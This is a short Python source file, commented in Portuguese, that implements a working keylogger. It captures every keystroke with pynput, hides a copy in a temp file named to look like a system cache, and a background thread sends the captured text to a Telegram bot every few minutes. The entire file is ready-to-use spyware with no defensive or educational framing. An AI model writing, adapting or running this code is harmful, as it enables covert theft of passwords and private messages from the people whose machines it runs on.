from pynput import keyboard
import threading
import time
import requests
import os

log = ""
path_logfile = os.path.join(os.getenv("TEMP") or "/tmp", "sys_input_cache.txt")

def tecla_para_str(tecla):
    try:
        return tecla.char
    except:
        t = str(tecla).replace("Key.", "")
        mapa = {
            "space": " ", "enter": "\n", "tab": "[TAB]", "shift": "", "ctrl_l": "[CTRL]",
            "backspace": "[DEL]", "esc": "[ESC]", "caps_lock": "[CAPS]", "alt_l": "[ALT]",
        }
        return mapa.get(t, f"[{t.upper()}]")

def pressionada(tecla):
    global log
    texto = tecla_para_str(tecla)
    log += texto

    # Armazena no disco também
    try:
        with open(path_logfile, "a", encoding="utf-8") as f:
            f.write(texto)
    except:
        pass

def enviar_logs(token, chat_id):
    global log
    while True:
        if len(log) >= 50 or time.localtime().tm_min % 5 == 0:  # a cada 5 min ou buffer cheio
            buffer = log
            log = ""
            partes = [buffer[i:i+4000] for i in range(0, len(buffer), 4000)]
            for parte in partes:
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{token}/sendMessage",
                        data={'chat_id': chat_id, 'text': f"🔑 Keylog:\n{parte}"}
                    )
                except:
                    pass
        time.sleep(60)

def iniciar_keylogger(token, chat_id):
    # Thread que envia os logs
    threading.Thread(target=enviar_logs, args=(token, chat_id), daemon=True).start()
    
    # Iniciar o listener oculto
    keyboard.Listener(on_press=pressionada, suppress=False).start()
